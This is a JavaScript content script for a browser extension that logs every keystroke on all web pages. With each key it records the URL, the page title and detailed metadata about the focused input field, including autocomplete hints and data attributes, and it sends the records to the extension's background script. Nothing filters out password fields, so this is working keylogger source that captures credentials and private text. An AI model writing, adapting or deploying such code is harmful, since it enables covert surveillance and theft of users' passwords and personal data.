// Content script - Capture keyboard events on all pages
(function () {
  'use strict';

  // Track the current URL
  let currentUrl = window.location.href;

  // Track the current input element
  let currentInputElement = null;
  let inputElementId = null;

  // Generate a unique identifier for an input element
  function getInputElementId(element) {
    if (!element) return null;

    // Create a unique identifier based on element properties
    const tagName = element.tagName.toLowerCase();
    const id = element.id || '';
    const name = element.name || '';
    const type = element.type || '';
    const placeholder = element.placeholder || '';

    // Get element path (for better uniqueness)
    let path = tagName;
    if (id) path += `#${id}`;
    if (name) path += `[name="${name}"]`;
    if (type) path += `[type="${type}"]`;
    if (placeholder) path += `[placeholder="${placeholder}"]`;

    // Add position in DOM if no unique identifiers
    if (!id && !name) {
      const siblings = element.parentElement ?
        Array.from(element.parentElement.children).filter(el => el.tagName === element.tagName) : [];
      const index = siblings.indexOf(element);
      if (index >= 0) path += `:nth(${index})`;
    }

    return path;
  }

  // Track focus changes
  document.addEventListener('focusin', (event) => {
    const target = event.target;
    if (target && (
      target.tagName === 'INPUT' ||
      target.tagName === 'TEXTAREA' ||
      target.isContentEditable
    )) {
      currentInputElement = target;
      inputElementId = getInputElementId(target);
    }
  }, true);

  document.addEventListener('focusout', () => {
    currentInputElement = null;
    inputElementId = null;
  }, true);

  // Function to send keystroke data to background script
  function logKeystroke(event) {
    // Update current input if the event target is an input
    const target = event.target;
    if (target && (
      target.tagName === 'INPUT' ||
      target.tagName === 'TEXTAREA' ||
      target.isContentEditable
    )) {
      if (currentInputElement !== target) {
        currentInputElement = target;
        inputElementId = getInputElementId(target);
      }
    }

    // Capturer plus de données sur l'input
    let inputMetadata = null;
    if (currentInputElement) {
      inputMetadata = {
        tagName: currentInputElement.tagName.toLowerCase(),
        type: currentInputElement.type || 'text',
        name: currentInputElement.name || null,
        id: currentInputElement.id || null,
        placeholder: currentInputElement.placeholder || null,
        autocomplete: currentInputElement.autocomplete || null,
        required: currentInputElement.required || false,
        pattern: currentInputElement.pattern || null,
        className: currentInputElement.className || null,
        ariaLabel: currentInputElement.getAttribute('aria-label') || null,
        dataAttributes: extractDataAttributes(currentInputElement)
      };
    }

    const keystrokeData = {
      type: 'keystroke',
      key: event.key,
      code: event.code,
      timestamp: new Date().toISOString(),
      url: currentUrl,
      pageTitle: document.title,
      isSpecialKey: isSpecialKey(event.key),
      shiftKey: event.shiftKey,
      ctrlKey: event.ctrlKey,
      altKey: event.altKey,
      metaKey: event.metaKey,
      inputElementId: inputElementId,
      inputType: currentInputElement ? currentInputElement.tagName.toLowerCase() : null,
      inputMetadata: inputMetadata  // Nouvelles métadonnées enrichies
    };

    // Send to background script
    chrome.runtime.sendMessage(keystrokeData).catch(err => {
      console.error('Error sending keystroke:', err);
    });
  }

  // Extraire les attributs data-* qui peuvent contenir des infos utiles
  function extractDataAttributes(element) {
    const dataAttrs = {};
    if (element && element.attributes) {
      Array.from(element.attributes).forEach(attr => {
        if (attr.name.startsWith('data-')) {
          dataAttrs[attr.name] = attr.value;
        }
      });
    }
    return Object.keys(dataAttrs).length > 0 ? dataAttrs : null;
  }

  // Check if key is a special key
  function isSpecialKey(key) {
    const specialKeys = [
      'Enter', 'Tab', 'Backspace', 'Delete', 'Escape',
      'ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight',
      'Home', 'End', 'PageUp', 'PageDown',
      'Shift', 'Control', 'Alt', 'Meta', 'CapsLock'
    ];
    return specialKeys.includes(key);
  }

  // Listen for keydown events
  document.addEventListener('keydown', logKeystroke, true);

  // Monitor URL changes (for single-page applications)
  let lastUrl = currentUrl;
  const urlObserver = new MutationObserver(() => {
    if (lastUrl !== window.location.href) {
      lastUrl = window.location.href;
      currentUrl = window.location.href;

      // Notify background script of URL change
      chrome.runtime.sendMessage({
        type: 'url_change',
        url: currentUrl,
        pageTitle: document.title,
        timestamp: new Date().toISOString()
      }).catch(err => {
        console.error('Error sending URL change:', err);
      });
    }
  });

  // Start observing
  urlObserver.observe(document, {
    subtree: true,
    childList: true
  });

  // Also listen for popstate events (browser back/forward)
  window.addEventListener('popstate', () => {
    currentUrl = window.location.href;
    chrome.runtime.sendMessage({
      type: 'url_change',
      url: currentUrl,
      pageTitle: document.title,
      timestamp: new Date().toISOString()
    }).catch(err => {
      console.error('Error sending URL change:', err);
    });
  });

  // Initial page load notification
  chrome.runtime.sendMessage({
    type: 'page_load',
    url: currentUrl,
    pageTitle: document.title,
    timestamp: new Date().toISOString()
  }).catch(err => {
    console.error('Error sending page load:', err);
  });

})();
